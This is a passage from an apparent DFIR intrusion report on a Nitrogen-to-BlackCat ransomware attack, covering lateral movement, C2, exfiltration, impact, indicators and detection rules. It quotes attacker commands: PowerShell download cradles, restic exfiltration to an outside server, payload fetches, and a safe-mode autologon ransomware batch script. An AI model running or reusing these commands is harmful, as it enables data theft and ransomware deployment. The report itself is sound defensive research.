None\n  Optional Dependencies: None\n  \n  .DESCRIPTION\n  When defining custom enums, structs, and unmanaged functions, it is\n  necessary to associate to an assembly module. This helper function\n  creates an in-memory module that can be passed to the 'enum',\n  'struct', and Add-Win32Type functions.\n  \n  .PARAMETER ModuleName\n  Specifies the desired name for the in-memory assembly and module. If\n  ModuleName is not provided, it will default to a GUID.\n  \n  .EXAMPLE\n  $Module = New-InMemoryModule -ModuleName Win32\n```\n\nPowerView was used to:\n\n- Gather the local admins.\n\n```\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:33121/'); Invoke-FindLocalAdminAccess -Thread 50\n```\n\n- Extract the servers in the environment.\n\n```\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:54350/'); Get-DomainComputer -OperatingSystem '*server*' -Properties 'name,operatingsystem,operatingsystemversion,lastlogontimestamp,dnshostname' -Ping >> srv.txt\n```\n\n### BloodHound\n\nThe $MFT showed that in the first phases of the intrusion, the threat actor performed a BloodHound collection to likely identify paths to escalate privileges to domain admin.\n\n```image\nAlt: BloodHound Example\nDescription: The image displays a portion of a file directory listing, highlighting specific entries related to a BloodHound zip file and another encoded file in a Windows directory path. The entry for 'BloodHound.zip.wragzl2' is emphasized with a red box, suggesting its significance in the context of the intrusion analysis. This file directory is likely part of an investigation into the actions taken by a threat actor during a cyber intrusion.\nTranscription: |\n  %LOCALAPPDATA%\n      _BloodHound.zip.wragzl2\n      YzZmMDBhNzEtZDZhNS00MGVhLWJjOGQtMzc5ZjEwZGUzZTg4.bin.wragzl2\n      srv.txt.wragzl2\n```\n\n---\n\n## Lateral Movement\n\n### Remote Desktop Protocol\n\nOn the first day of the intrusion, four hours after the Nitrogen execution, the threat actor started interacting with other systems such as a file server through a Cobalt Strike beacon injected into `winlogon.exe`.\n\n```image\nAlt: RDP Example\nDescription: The image displays a table capturing logs related to Remote Desktop Protocol (RDP) connections. It includes columns for `destination.ip`, `destination.port`, `event.module`, and `process.executable`. The port number '3389' is highlighted in red, indicating the use of RDP, which is commonly exploited in lateral movement during cyber intrusions. All entries refer to the same executable path, `C:\\\\Windows\\\\System32\\\\winlogon.exe`, suggesting repeated activity associated with this process.\nTranscription: |\n  | destination.ip | destination.port | event.module | process.executable               |\n  | -------------- | ---------------- | ------------ | -------------------------------- |\n  |                | 3,389            | sysmon       | C:\\Windows\\System32\\winlogon.exe |\n  |                | 3,389            | sysmon       | C:\\Windows\\System32\\winlogon.exe |\n  |                | 3,389            | sysmon       | C:\\Windows\\System32\\winlogon.exe |\n```\n\n### Windows Management Instrumentation (WMI)\n\nFour hours after initial access, the threat actor moved laterally to a server using Impacket’s `wmiexec` and downloaded a ZIP file containing Python and a Cobalt Strike beacon (`wo12.py` and `wo14.py`).\n\n```image\nAlt: WMI Example\nDescription: The image depicts a detailed log analysis of network traffic related to Windows Management Instrumentation (WMI) communications. It includes a timestamped list of events showing the source and destination IP addresses, protocol used (IWBMESERVICES), and specific method calls such as 'ExecMethod request' for executing operations on Win32 processes. The right side of the image features a hexadecimal representation of the data packets, providing insight into the payloads transmitted during the WMI lateral movement.\nTranscription: |\n  | Time                                | Protocol      | Source | Destination | SourcePort | DestinationPort | Info                                         |\n  | ----------------------------------- | ------------- | ------ | ----------- | ---------- | --------------- | -------------------------------------------- |\n  | 239345  2023-11-08  14:47:14.268612 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | GetObject request Object=Win32 Process       |\n  | 239458  2023-11-08  14:47:16.956161 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1896 bytes)] |\n  | 240590  2023-11-08  14:48:13.271401 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1921 bytes)] |\n  | 243514  2023-11-08  14:49:13.588920 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1916 bytes)] |\n  | 249361  2023-11-08  14:50:22.933327 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1928 bytes)] |\n  | 251771  2023-11-08  14:51:36.879267 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1920 bytes)] |\n  | 252321  2023-11-08  14:51:42.567560 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (2066 bytes)] |\n  | 258074  2023-11-08  14:52:48.157178 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (2140 bytes)] |\n  | 279818  2023-11-08  14:54:21.703678 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1924 bytes)] |\n  | 282076  2023-11-08  14:54:49.213133 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1924 bytes)] |\n  | 290147  2023-11-08  15:05:54.326460 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1956 bytes)] |\n  | 296557  2023-11-08  15:07:05.543836 | IWBMESERVICES | 10.    | 10.         | 60847      | 49667           | ExecMethod request [Long frame (1956 bytes)] |\n```\n\n### Pass the Hash\n\nDuring the intrusion, we observed three instances of possible pass-the-hash activity in the logs. These involved instances where the threat actor appeared to be moving from the SYSTEM context to a domain administrator account.\n\n```image\nAlt: Pass the Hash Example\nDescription: The image displays a log entry indicating a successful logon event. It includes detailed logon information, such as the Security ID, Account Name (SYSTEM), Logon Type (9), and associated process information, particularly highlighting the Logon Process identified as 'seclogo'. This log entry suggests the use of impersonation, which is relevant to the discussion of lateral movement and pass-the-hash techniques in cybersecurity contexts.\nTranscription: |\n  An account was successfully logged on.\n  \n  Subject:\n    Security ID:            S-1-5-18\n    Account Name:           $\n    Account Domain:         [REDACTED]\n    Logon ID:               0x3E7\n  \n  Logon Information:\n    Logon Type:             9\n    Restricted Admin Mode:   -\n    Virtual Account:        No\n    Elevated Token:         Yes.\n  \n  Impersonation Level:      Impersonation\n  \n  New Logon:\n    Security ID:            S-1-5-18\n    Account Name:           SYSTEM\n    Account Domain:         NT AUTHORITY\n    Logon ID:               0x194CACA6\n    Linked Logon ID:        0x0\n    Network Account Name:   [REDACTED]\n    Network Account Domain:  [REDACTED]\n    Logon GUID:             {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID:             0x17c\n    Process Name:           C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:       -\n    Source Network Address: ::1\n    Source Port:            0\n  \n  Detailed Authentication Information:\n    Logon Process:          seclogo\n    Authentication Package: Negotiate\n    Transited Services:     -\n    Package Name (NTLM only):  -\n    Key Length:             0\n```\n\n### SMB Admin Shares\n\nWhile some of the threat actor’s payloads were downloaded from a remote resource, they also transferred their tooling laterally using SMB and then executed it using WMIC or `wmiexec`.\n\n```image\nAlt: SMB Example\nDescription: The image displays a technical output related to a network share object check. It includes details such as the Security ID, Account Name (Administrator), Logon ID, Source Address, and Source Port. It outlines the share information, including the share name and path, as well as access request information and access check results. This information is relevant to analyzing lateral movement in cybersecurity, specifically in the context of the SMB protocol.\nTranscription: |\n  A network share object was checked to see whether client can be granted desired access.\n  \n  Subject:\n      Security ID: S-1-5-21-xxxxxxxxxx-500\n      Account Name: Administrator\n      Account Domain: \n      Logon ID: 0x64B1A39\n  \n  Network Information:\n      Object Type: File\n      Source Address: 10.xxx.208\n      Source Port: 60008\n  \n  Share Information:\n      Share Name: \\\\*\\C$\n      Share Path: \\??\\C:\\\n      Relative Target Name: windows\\adf$\\py\\wo14.py\n  \n  Access Request Information:\n      Access Mask: 0x2\n      Accesses: WriteData (or AddFile)\n  \n  Access Check Results:\n      -\n```\n\n---\n\n## Command and Control\n\nOver the course of the intrusion, the threat actor relied on Sliver and Cobalt Strike. Sliver was used most heavily during the first day of the intrusion, with Cobalt Strike being used over the full length of the intrusion.\n\n```image\nAlt: C2 Example\nDescription: The image displays a bar chart illustrating the sum of network bytes associated with Silver Command and Control traffic. The chart shows a significant spike on the left, indicating a large volume of network traffic during the initial phase of the intrusion, followed by much lower levels of traffic, represented by smaller bars. This visual representation highlights the heavy reliance on the Sliver tool during the early stages of the attack.\nTranscription: |\n  Silver Command and Control Traffic\n  \n  Sum of network bytes\n  \n  [Bar graph representation with varying heights]\n  - 194.49.94.18\n  - 194.169.175...\n```\n\n### Cobalt Strike\n\n#### Configuration for `wo14.py`\n\n```\nBeaconType                       - HTTPS\nPort                             - 443\nSleepTime                        - 38500\nMaxGetSize                       - 13982519\nJitter                           - 27\nC2Server                         - 91.92.250.65,/broadcast\nUserAgent                        - Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nHttpPostUri                      - /1/events/com.amazon.csm.csa.prod\n```\n\n#### Configuration for `wo12.py`\n\n```\nBeaconType                       - HTTPS\nPort                             - 443\nSleepTime                        - 38500\nMaxGetSize                       - 13982519\nJitter                           - 27\nC2Server                         - 91.92.250.60,/broadcast\nUserAgent                        - Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\nHttpPostUri                      - /1/events/com.amazon.csm.csa.prod\n```\n\nThe two Cobalt Strike C2 servers showed the classic HTTP response related to the post-exploitation framework:\n\n```\nHTTP/1.1 404 Not Found\nContent-Type: text/plain\nDate: Day, DD Mmm YYYY HH:MM:SS GMT\nContent-Length: 0\n```\n\n```image\nAlt: Cobalt Strike HTTP Response\nDescription: The image displays a screenshot of an HTTP response from a command and control server identified as having the IP address 91.92.250.60. It indicates a '404 Not Found' error message, along with details such as the date and time of the response, the content type (text/plain), and that the content length is zero. The connection is established over HTTPS on port 443.\nTranscription: |\n  HTTP/1.1 404 Not Found\n  Date: Mon, 13 Nov 2023 17:01:07 GMT\n  Content-Type: text/plain\n  Content-Length: 0\n```\n\nBy diving deeper into the two command and control servers, it was noticed that both of them exposed the HTTP service on port 81 with the following HTTP response.\n\n```image\nAlt: HTTP Response Example\nDescription: The image displays an HTTP response captured from a command and control server. It contains the following details: the HTTP status line indicating a '307 Temporary Redirect', the content type as 'text/html; charset=utf-8', a location header pointing to 'https://www.cloudflare.com/', the date and time of the response, and the content length of 63 bytes. The server's IP address is shown as '91.92.250.65' on port '81'.\nTranscription: |\n  HTTP/1.1 307 Temporary Redirect\n  Content-Type: text/html; charset=utf-8\n  Location: https://www.cloudflare.com/\n  Date: Sun, 12 Nov 2023 10:08:29 GMT\n  Content-Length: 63\n```\n\nA FOFA query was built to identify further potential C2 servers matching this pattern:\n\n```\n\"HTTP/1.1 307 Temporary Redirect\" && \"Content-Type: text/html; charset=utf-8\" && \"Location: https://www.cloudflare.com/\" && \"Content-Length: 63\" && port=\"81\" && protocol=\"http\"\n```\n\nBased on FOFA results, all the identified command and control servers were in Bulgaria and the Netherlands.\n\n#### Identified C2 Servers\n\n| IP             | Country |\n| -------------- | ------- |\n| 91.92.240.175  | BG      |\n| 91.92.240.194  | BG      |\n| 91.92.241.117  | BG      |\n| 91.92.242.182  | BG      |\n| 91.92.242.39   | BG      |\n| 91.92.242.55   | BG      |\n| 91.92.245.174  | BG      |\n| 91.92.245.175  | BG      |\n| 91.92.247.123  | BG      |\n| 91.92.247.127  | BG      |\n| 91.92.249.110  | BG      |\n| 91.92.250.148  | BG      |\n| 91.92.250.158  | BG      |\n| 91.92.250.60   | BG      |\n| 91.92.250.65   | BG      |\n| 91.92.250.66   | BG      |\n| 91.92.251.240  | BG      |\n| 94.156.67.175  | BG      |\n| 94.156.67.180  | BG      |\n| 94.156.67.185  | BG      |\n| 94.156.67.188  | BG      |\n| 141.98.6.195   | NL      |\n| 193.42.33.14   | NL      |\n| 194.180.48.165 | NL      |\n| 194.180.48.42  | NL      |\n| 194.49.94.21   | NL      |\n| 194.49.94.22   | NL      |\n\n---\n\n## Exfiltration\n\nThe threat actor used Restic to exfiltrate directories directly from a file server. Below are the commands used by the threat actor to initiate the backup repository and exfiltrate the data:\n\n```\nrestic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt\nrestic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup \"F:\\Shares\\<REDACTED>\\<REDACTED>\"\n```\n\nThe traffic related to this activity triggered the following Suricata alert: `ET USER_AGENTS Go HTTP Client User-Agent`. Investigating the Suricata EVE flow logs revealed the usage of Restic thanks to the `Content-Type` HTTP header:\n\n```\nhttp: {\nprotocol: \"HTTP/1.1\",\nhttp_content_type: \"application/vnd.x.restic.rest.v2\"\n}\n```\n\n---\n\n## Impact\n\nThe threat actor dropped and executed two batch scripts, `up.bat` and `1.bat`, remotely using PsExec on targeted servers to perform various operations.\n\n### `up.bat`\n\nThe script was executed remotely on a domain controller using the following command:\n\n```\ncmd.exe /C PsExec64.exe -accepteula \\\\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat\n```\n\nThe script contained a one-liner to reset the password to a privileged service account:\n\n```\nnet  user REDACTED JapanNight!128 /domain\n```\n\n### `1.bat`\n\nThe second script was executed on multiple hosts using the following command:\n\n```\ncmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat\n```\n\nThe script contained the following commands:\n\n```\nbcdedit  /set {default} safeboot network\nfindstr  /C:\"The operation completed successfully.\"\nreg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v *a /t REG_SZ /d \"cmd.exe /c C:\\<REDACTED-COMPANY-NAME>.exe\" /f\nfindstr  /C:\"The operation completed successfully.\"\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <REDACTED-DOMAIN-NAME>\\backup2 /f\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d JapanNight!128 /f\nreg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f\ntimeout  /T 10\nshutdown  -r -t 0\n```\n\nThese commands performed the following operations:\n\n1. Set the default boot configuration to \"safe mode with networking.\"\n2. Enabled automatic logon using the service account.\n3. Added the ransomware binary to `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce` for execution on system startup.\n4. Initiated an immediate system restart after a 10-second delay.\n\nThe ransomware binary executed multiple files and utilities, clearing logs and deleting volume shadow copies.\n\n```image\nAlt: Ransomware Execution\nDescription: The image displays a command-line interface output that outlines various options for a script or tool related to ransomware execution. The options include flags for specifying access tokens, logging, network behavior, and operational parameters like rebooting in safe mode and file processing paths. This technical information is directly relevant to understanding the behavior and functionality of ransomware within the context of cyber threat intelligence.\nTranscription: |\n  USAGE:\n  [OPTIONS] [SUBCOMMAND]\n  \n  OPTIONS:\n    --access-token <ACCESS_TOKEN>\n          Access Token\n  \n    --drag-and-drop\n          Invoked with drag and drop\n  \n    --drop-drag-and-drop-target\n          Drop drag and drop target batch file\n  \n    --extra-verbose\n          Log more to console (Also forces process to run in attached mode)\n  \n    -h, --help\n          Print help information\n  \n    --log-file <LOG_FILE>\n          Enable logging to specified file\n  \n    --no-impers\n          Do not spawn impersonated processes on Windows\n  \n    --no-net\n          Do not discover network shares on Windows\n  \n    --no-prop\n          Do not self propagate(worm) on Windows\n  \n    --no-prop-servers <NO_PROP_SERVERS>\n          Do not propagate to defined servers\n  \n    --no-vm-kill\n          Do not stop VMs on ESXi\n  \n    --no-vm-kill-names <NO_VM_KILL_NAMES>\n          Do not stop defined VMs on ESXi\n  \n    --no-vm-snapshot-kill\n          Do not wipe VMs snapshots on ESXi\n  \n    --no-wall\n          Do not update desktop wallpaper on Windows\n  \n    -P, --paths <PATHS>\n          Only process files inside defined paths\n  \n    --prop-file <PROP_FILE>\n          Propagate specified file\n  \n    --safeboot\n          Reboot in Safe Mode before running on Windows\n  \n    --safeboot-instance\n          Run as safeboot instance on Windows\n  \n    --safeboot-network\n          Reboot in Safe Mode with Networking before running on Windows\n  \n    --sleep-restart <SLEEP_RESTART>\n          Sleep for duration in seconds after successful run and then restart. (This is soft persistence, keeps process alive no longer then defined in --sleep-restart-duration, 24 hours by default)\n  \n    --sleep-restart-duration <SLEEP_RESTART_DURATION>\n          Keep soft persistence alive for duration in seconds. (24 hours by default)\n  \n    --sleep-restart-until <SLEEP_RESTART_UNTIL>\n          Keep soft persistence alive until defined UTC time in millis. (Defaults to 24 hours since launch)\n  \n    --ui\n          Show user interface\n  \n    -v, --verbose\n          Log to console\n```\n\nUpon execution, the binary started encrypting files and dropping the ransom note.\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note in a Notepad window, titled 'RECOVER-wragzl2-FILES.txt.' The note informs the victim that important files have been encrypted and now carry the 'wragl2' extension. It details the sensitive data that was downloaded, including personal information and financial documents, and provides instructions for the victim on how to proceed, including downloading the Tor browser and accessing a user panel. The note emphasizes the urgency of the situation and warns against modifying the encrypted files.\nTranscription: |\n  RECOVER-wragzl2-FILES.txt - Notepad\n  \n  >> What happened?\n  \n  Important files on your network was ENCRYPTED and now they have \"wragzl2\" extension.\n  In order to recover your files you need to follow instructions below.\n  \n  >> Sensitive Data\n  \n  Sensitive data on your network was DOWNLOADED.\n  If you DON'T WANT your sensitive data to be PUBLISHED you have to act quickly.\n  \n  Data includes:\n  - Employees personal data, CVs, DL, SSN.\n  - Complete network map including credentials for local and remote services.\n  - Private financial information including: clients data, bills, budgets, annual reports, bank statements.\n  - Manufacturing documents including: datagrams, schemas, drawings in solidworks format.\n  - And more...\n  \n  Samples are available on your User Panel.\n  \n  >> CAUTION\n  \n  DO NOT MODIFY ENCRYPTED FILES YOURSELF.\n  DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.\n  YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.\n  \n  >> What should I do next?\n  1) Download and install Tor Browser from: https://torproject.org/\n  2) Navigate to User Panel: http://[REDACTED]/?access-key=[REDACTED]\n```\n\n---\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline of the Nitrogen Campaign, documenting various stages of a cyber attack, including initial access, discovery, command and control, credential access, lateral movement, persistence, exfiltration, and impact. Each entry is timestamped in UTC, outlining specific actions taken by the attackers, such as executing malware, establishing backdoors, and conducting reconnaissance. The timeline spans multiple days and highlights crucial techniques employed during the cyber campaign.\nTranscription: |\n  25590 - Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware\n  \n  Day 1\n  \n  12:16 UTC - Initial Access\n  - Victim executes Nitrogen (Advanced IP Scanner)\n  - DLL Sideloading: Python311.dll\n  - Nitrogen drops sliver beacon\n  - C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\py.exe\n  - G2: 194.91.49.184/43\n  \n  12:24 UTC - Discovery\n  - net user: \"Kminis admin\" /domain\n  - scoring: 28\n  - net localgroup: Administrators\n  - net localgroup: \"Domain Computers\" /domain\n  \n  12:38 UTC - Persistence\n  - Scheduled Tasks\n  - schtasks /create /tn \"PC (HACKED)\" /xml \"C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\slack.xml\"\n  - schtasks /create /tn \"System\" /xml \"C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\slack.xml\"\n  - Register Keys\n  - reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"slack\" /t REG_SZ /d \"C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\py.exe\"\n  \n  13:36 UTC - Command & Control\n  - Cobalt Strike beacon execution\n  - C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\py.py\n  - W1: 72.225.60.43\n  \n  14:05 UTC - Discovery\n  - net group: (Domain)\n  - net group: \"Domain Controllers\" /domain\n  \n  14:25 UTC - Credential Access\n  - Cobalt Strike: LSASS dumping\n  - Obtained local admin credentials\n  \n  14:47 UTC - Lateral Movement\n  - RDP execution to server\n  - curl -s https://192.245.24.250/ben-ao-0 -o /tmp/ben-ao-0\n  - powershell -w hidden -command \"Invoke-WebRequest 'https://192.245.24.250/ben-ao-0' -OutFile ben-ao-0\"\n  - W1: 72.225.60.43\n  \n  15:12 UTC - Persistence\n  - Saved pattern of scheduled tasks and startup registry changes observed on beacons replicated on server\n  \n  15:25 UTC - Command & Control\n  - Silver beacon execution\n  - C:\\Users\\{HACKED}\\AppData\\Local\\Temp\\python.exe on workstation\n  - 194.187.15.184/43\n  \n  15:58 UTC - Persistence\n  - Same pattern of scheduled tasks and startup registry changes observed on beacons replicated for new silver beacon\n  \n  16:33 UTC - Lateral Movement & Persistence\n  - Same silver execution pattern as previously replicated to another server\n  - Cobalt Strike beacon execution\n  - W1: 72.225.60.43\n  \n  16:44 UTC - Discovery\n  - Run from servers server\n  - net group: \"Domain Admins\" /domain\n  - net group: \"Domain Computers\" /domain\n  \n  16:55 UTC - Lateral Movement & Persistence\n  - Same pattern of tasks and persistence replicated to file server\n  \n  18:17 UTC - Exfiltration\n  - Threat actor status notice on the file server to exfiltrate file source data\n  - retic.exe - wget https://192.123.226.80:8443/retic.exe -o\n  - ps: net user \"retic\" /add /domain\n  \n  Day 7\n  \n  13:55 UTC - Discovery\n  - RDP access to backup server and backups reviewed\n  \n  00:45 UTC - Discovery and Lateral Movement\n  - net group: \"domain controllers\" /domain\n  - access by: \"DOMAIN CONTROLLERS\\admin\" /E:1 /T:1\n  - uname: \"DOMAIN CONTROLLERS\" process can access \"C:\\Windows\\system32\\cmd.exe /c v1.py\"\n  \n  00:11 UTC - Impact\n  - Ransomware executed on fileserver\n  \n  16:56 UTC - Credential Access\n  - 2nd lateral server\n  - Cobalt Strike: LSASS dumping\n  - Likely obtain domain admin credentials\n  \n  Day 8\n  \n  01:00 UTC - Impact\n  - Reset privileged backup account user\n  - net user {REDACTED}.japan1987@domain\n  - Copy ransomware binary to remote hosts\n  - cmd.exe /c \"copy /y \\\\%s\\%s\\%s\\%s\\%s\\%s\\%s.exe\"\n  \n  01:12 UTC - Impact\n  - Ransomware executed against workstations and other servers\n  - cmd.exe /c \"del /f /q \\\\%s\\%s\\%s\\%s\\%s\\%s\\%s\"\n  \n  02:13 UTC - Impact\n  - Ransomware spread to domain controllers and other servers\n```\n\n---\n\n## Diamond Model\n\n```image\nAlt: Diamond Model\nDescription: The image depicts a Diamond Model framework for analyzing a cyber threat campaign associated with the 'Nitrogen Campaign'. It includes four main components: Adversary, Infrastructure, Capabilities/TTPs (Tactics, Techniques, and Procedures), and Victim. Each component is detailed with specific examples, such as IP addresses related to the 'Sliver' and 'Cobalt Strike' tools, the adversary's provided password, and the list of capabilities utilized in the attack, including 'SharpHound' and 'PowerSploit'. The diagram visually represents the relationships and flow of information within the attack, making it a valuable resource for understanding the attack structure.\nTranscription: |\n  Adversary\n    Threat Actor supplied password for domain admin account\n    JapanNight!l28\n  \n  Infrastructure\n    194.49.94.18\n      Silver\n    194.169.175.134\n    91.92.250.60\n      Cobalt Strike\n    91.92.250.65\n    91.92.245.26\n      Staging\n    195.123.226.84\n      Exfiltration\n  \n  Capabilities/TTPs\n    Nitrogen\n      Initial Access\n    PyFuscate\n      Silver\n      Cobalt Strike\n    Windows Utilities Discovery\n      nltest\n      ping\n      net\n      ipconfig\n    SharpHound\n    PowerSploit\n      Invoke-FindLocalAdminAccess\n      Get-DomainComputer\n    Impacket\n    Restic\n    up.bat\n    l.bat\n    PsExec\n    BlackCat Ransomware\n  \n  Victim\n    Workstations\n    Servers\n    Domain Controllers\n```\n\n---\n\n## Indicators\n\n### Atomic\n\n```\nSliver\n194.49.94[.]18:8443\n194.169.175[.]134:8443\n\nCobalt Strike\n91.92.250[.]60:443\n91.92.250[.]65:443\n\nStaging Tool Server\n91.92.245[.]26:443\n\nExfiltration Server\n195.123.226[.]84:8000\n```\n\n### Computed\n\n```\nVersion.zip\nDBF5F56998705C37076B6CAE5D0BFB4D\nE6AB3C595AC703AFD94618D1CA1B8EBCE623B21F\n5DC8B08C7E1B11ABF2B6B311CD7E411DB16A7C3827879C6F93BD0DAC7A71D321\n\nwo14.py\nEB64862F1C8464CA3D03CF0A4AC608F4\n6F43E6388B64998B7AA7411104B955A8949C4C63\n726F038C13E4C90976811B462E6D21E10E05F7C11E35331D314C546D91FA6D21\n\nworksliv.py\n3A4FDBC642A24A240692F9CA70757E9F\n794203A4E18F904F0D244C7B3C2F5126B58F6A21\n5F7D438945306BF8A7F35CAB0E2ACC80CDC9295A57798D8165EF6D8B86FBB38D\n\nslv.py\n7A4CB8261036F35FD273DA420BF0FD5E\n9648559769179677C5B58D5619CA8872F5086312\n4EF1009923FC12C2A3127C929E0AA4515C9F4D068737389AFB3464C28CCF5925\n\nwork.aes\n1BE7FE8E20F8E9FDC6FD6100DCAD38F3\nC4CDE794CF4A68D63617458A60BC8B90D99823CA\n4EE4E1E2CEDF59A802C01FAE9CCFCFDE3E84764C72E7D95B97992ADDD6EDF527\n\ndata.aes\n4232C065029EB52D1B4596A08568E800\n79818110ABD52BA14800CDFF39ECA3252412B232\n3298629DE0489C12E451152E787D294753515855DBF1CE80BFCDED584A84AC62\n\nservice_probes\n637FB65A1755C4B6DC1E0428E69B634E\nFBA4652B6DBE0948D4DADCEBF51737A738CA9E67\nB3B1FF7E3D1D4F438E40208464CEBFB641B434F5BF5CF18B7CEC2D189F52C1B6\n\nUpdateEG.bat\n0B1882F719504799B3211BF73DFDC253\n448892D5607124FDD520F62FF0BC972DF801C046\n39EC2834494F384028AD17296F70ED6608808084EF403714CFBC1BFBBED263D4\n\npython311.dll\nE20FC97E364E859A2FB58D66BC2A1D05\nF5F56413F81E8F4A941F53E42A90BA1720823F15\n9514035FEA8000A664799E369AE6D3AF6ABFE8E5CDA23CDAFBEDE83051692E63\n\nexample.exe\nC737A137B66138371133404C38716741\nA3E4FB487400D99E3A9F3523AEAA9AF5CF6E128B\n25172A046821BD04E74C15DC180572288C67FDFF474BDB5EB11B76DCE1B3DAD3\n\n2-REDACTED-51.exe\n7A1E7F652055C812644AD240C41D904A\nB39C244C3117F516CE5844B2A843EFF1E839207C\n5FAC60F1E97B6EAAE18EBD8B49B912C86233CF77637590F36AA319651582D3C4\n\ndomain_name.exe\nE0D1CF0ABD09D7632F79A8259283288D\n3A78CE27A7AA16A8230668C644C7DF308DE6CF33\nD15CAB3901E9A10AF772A0A1BDBF35B357EE121413D4CF542D96819DC4471158\n```\n\n---\n\n## Detections\n\n### Network\n\n```\nETPRO JA3 Hash - Possible Ligolo Server/Golang Binary Response\nET USER_AGENTS Go HTTP Client User-Agent\nET POLICY SMB2 NT Create AndX Request For an Executable File\nET POLICY SMB Executable File Transfer\nET POLICY PsExec service created\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET POLICY Command Shell Activity Over SMB - Possible Lateral Movement\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY SMB2 NT Create AndX Request For a .bat File\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement\nET INFO Suspected Impacket WMIExec Activity\nET INFO Observed Cloudflare DNS over HTTPS Domain (cloudflare-dns .com in TLS SNI)\nET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection\nET HUNTING Terse Unencrypted Request for Google - Likely Connectivity Check\nETPRO USER_AGENTS Observed Suspicious UA (Mozilla/5.0)\n```\n\n### Sigma\n\nSearch rules on detection.fyi or sigmasearchengine.com.\n\n#### DFIR Private Rules\n\n```\n934fa692-f2fa-4465-8bb3-ee1d4c0718cc : Enabling Safeboot with BCDEDIT\n181f510b-0b3c-4e05-939c-7623a4a9c82c : Execution of Python Scripts in AppData Directory\n6f77de5c-27af-435b-b530-e2d07b77a980 : Impacket Tool Execution\nd2722770-3295-478e-bd58-c3c18baaa821 : Modification of UserInit Registry Value\n3f684d2e-4760-4db9-a578-3698e21a01d5 : Modification of UserInit Registry Value\n2249fc47-1825-4137-b9ce-aa65749bb68c : Restic Backup Tool Misuse\n```\n\n#### Sigma Repo\n\n```\n5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE\n968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity\n8d5aca11-22b3-4f22-b7ba-90e60533e1fb : Wmiexec Default Output File\n526be59f-a573-4eea-b5f7-f0973207634d : New Process Created Via Wmic.EXE\n7cccd811-7ae9-4ebe-9afd-cb5c406b824b : Potential Execution of Sysinternals Tools\n42c575ea-e41e-41f1-b248-8093c3e82a28 : PsExec Service Installation\n8eef149c-bd26-49f2-9e5a-9b00e3af499b : Pass the Hash Activity 2\n192a0330-c20b-4356-90b6-7b7049ae0b8 : Successful Overpass the Hash Attempt\nd7662ff6-9e97-4596-a61d-9839e32dee8d : Add SafeBoot Keys Via Reg Utility\ncc36992a-4671-4f21-a91d-6c2b72a2edf5 : Suspicious Eventlog Clearing or Configuration Change Activity\nc947b146-0abc-4c87-9c64-b17e9d7274a2 : Shadow Copies Deletion Using Operating Systems Utilities\ndcd74b95-3f36-4ed9-9598-0490951643aa : PowerView PowerShell Cmdlets - ScriptBlock\n```\n\n### Yara\n\n- DFIR Yara Rules\n- Nitrogen Yara Rule\n- Nitrogen Python DLL Rule\n- Elastic Protections Artifacts\n\n---\n\n## MITRE ATT&CK\n\n```image\nAlt: MITRE ATT&CK Mapping\nDescription: The image is a detailed table summarizing the techniques and tools associated with the Nitrogen Campaign that involves the Sliver and BlackCat ransomware. It categorizes various tactics such as Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, 